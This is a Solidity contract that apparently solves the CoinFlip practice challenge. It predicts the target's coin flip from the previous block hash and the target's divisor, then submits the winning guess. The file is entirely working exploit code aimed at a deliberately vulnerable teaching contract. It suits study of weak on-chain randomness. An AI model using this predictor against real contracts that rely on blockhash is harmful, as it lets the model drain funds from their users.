// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";
import "hardhat/console.sol";

contract CoinFlipAttacker {
    CoinFlip target = CoinFlip(address(0));
    uint256 FACTOR;

    constructor(address _target) public {
        target = CoinFlip(_target);
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    }

    function getBlockValue() public returns (uint256) {
        return uint256(blockhash(block.number - 1));
    }

    function getSolution() public returns (bool) {
        uint256 blockValue = getBlockValue();

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    function attack() public {
        target.flip(this.getSolution());
    }

    function getConsecutiveWins() public view returns (uint256) {
        return target.consecutiveWins();
    }
}
